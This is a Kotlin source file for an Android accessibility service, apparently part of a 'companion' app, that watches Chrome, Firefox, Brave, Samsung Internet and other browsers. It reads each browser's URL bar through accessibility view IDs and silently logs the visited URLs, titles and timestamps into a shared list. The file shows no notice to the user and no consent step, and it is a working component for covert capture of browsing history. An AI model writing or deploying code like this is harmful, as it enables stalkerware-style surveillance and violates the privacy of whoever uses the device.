package com.snapapp.companion

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class BrowserAccessibilityService : AccessibilityService() {

    companion object {
        val capturedUrls = mutableListOf<Map<String, String>>()
        private var lastCapturedUrl = ""
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || rootInActiveWindow == null) return

        val pkg = event.packageName?.toString() ?: ""
        if (!isBrowserPackage(pkg)) return

        val node = findUrlBarNode(rootInActiveWindow)
        val rawUrl = node?.text?.toString() ?: return

        if (rawUrl.isNotBlank() && rawUrl != lastCapturedUrl && (rawUrl.contains(".") || rawUrl.startsWith("http"))) {
            lastCapturedUrl = rawUrl
            val fullUrl = if (!rawUrl.startsWith("http")) "https://$rawUrl" else rawUrl
            val item = mapOf(
                "browser_name" to getBrowserLabel(pkg),
                "url" to fullUrl,
                "title" to (rootInActiveWindow.contentDescription?.toString() ?: rawUrl),
                "visit_time" to System.currentTimeMillis().toString()
            )
            synchronized(capturedUrls) {
                if (capturedUrls.size > 200) capturedUrls.removeAt(0)
                capturedUrls.add(item)
            }
        }
    }

    private fun isBrowserPackage(pkg: String): Boolean {
        return pkg.contains("chrome") || pkg.contains("browser") || pkg.contains("firefox") || pkg.contains("brave")
    }

    private fun getBrowserLabel(pkg: String): String {
        return when {
            pkg.contains("chrome") -> "Google Chrome"
            pkg.contains("brave") -> "Brave Browser"
            pkg.contains("firefox") -> "Firefox"
            pkg.contains("sec.android.app.sbrowser") -> "Samsung Internet"
            else -> "Mobile Browser"
        }
    }

    private fun findUrlBarNode(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        val idNames = listOf("url_bar", "location_bar_edit_text", "search_box_text", "address_bar")
        for (id in idNames) {
            val list = root.findAccessibilityNodeInfosByViewId(id)
            if (list.isNotEmpty()) return list[0]
        }
        return null
    }

    override fun onInterrupt() {}
}
